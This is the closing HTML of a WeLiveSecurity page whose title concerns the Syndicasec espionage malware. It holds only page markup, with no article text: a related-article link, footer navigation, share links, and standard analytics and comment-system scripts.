                                                <a href="https://www.welivesecurity.com/category/privacy/" class="category-tag-btn">Privacy</a>                                                <a href="https://www.welivesecurity.com/2022/02/15/questions-linger-irs-about-face-facial-recognition/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/02/irs-id.me-facial-recognition-623x415.jpg"
                                                         alt="Syndicasec in the sin bin: targeted espionage malware in action">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/02/15/questions-linger-irs-about-face-facial-recognition/">
                                                    Questions linger after IRS’s about-face on facial recognition                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2013%2F05%2F23%2Fsyndicasec-in-the-sin-bin%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/js/main.js?id=fef3139dcedd23afc232"></script>
    <!-- Version: v1.10.0.0df103.pro.azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"21384 \/?p=21384","disqusShortname":"welivesecurity","disqusTitle":"Syndicasec in the sin bin: targeted espionage malware in action","disqusUrl":"https:\/\/www.welivesecurity.com\/2013\/05\/23\/syndicasec-in-the-sin-bin\/","postId":"21384"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>
